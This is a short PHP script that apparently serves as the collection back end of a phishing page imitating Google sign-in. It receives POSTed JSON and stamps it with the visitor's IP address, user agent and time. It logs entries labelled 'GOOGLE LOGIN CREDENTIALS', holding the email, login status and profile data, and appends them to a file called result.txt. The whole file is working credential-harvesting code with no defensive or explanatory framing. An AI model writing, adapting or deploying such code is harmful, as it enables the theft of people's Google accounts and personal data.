<?php

if($_SERVER['REQUEST_METHOD'] == "POST"){
    $data = $_POST['data'];
    
    $decodedData = json_decode($data, true);
    
    $decodedData['server_timestamp'] = date('Y-m-d H:i:s');
    $decodedData['ip_address'] = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $decodedData['user_agent'] = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
    
    $formattedData = "=== Google Login Data ===\n";
    $formattedData .= "Timestamp: " . $decodedData['server_timestamp'] . "\n";
    $formattedData .= "IP Address: " . $decodedData['ip_address'] . "\n";
    $formattedData .= "User Agent: " . $decodedData['user_agent'] . "\n";
    
    if(isset($decodedData['type']) && $decodedData['type'] == 'google_login') {
        $formattedData .= "=== GOOGLE LOGIN CREDENTIALS ===\n";
        $formattedData .= "Email: " . $decodedData['email'] . "\n";
        $formattedData .= "Login Status: " . $decodedData['data']['loginStatus'] . "\n";
        $formattedData .= "Profile Data: " . json_encode($decodedData['data'], JSON_PRETTY_PRINT) . "\n";
        $formattedData .= "=====================================\n";
    } else {
        $formattedData .= "Browser Data: " . json_encode($decodedData, JSON_PRETTY_PRINT) . "\n";
    }
    
    $formattedData .= "================================\n\n";
    
    file_put_contents("result.txt", $formattedData, FILE_APPEND | LOCK_EX);
    
    header('Content-Type: application/json');
    echo json_encode(['status' => 'success', 'message' => 'Data saved successfully']);
} else {
    header('Content-Type: application/json');
    http_response_code(405);
    echo json_encode(['status' => 'error', 'message' => 'Method not allowed']);
}

?>
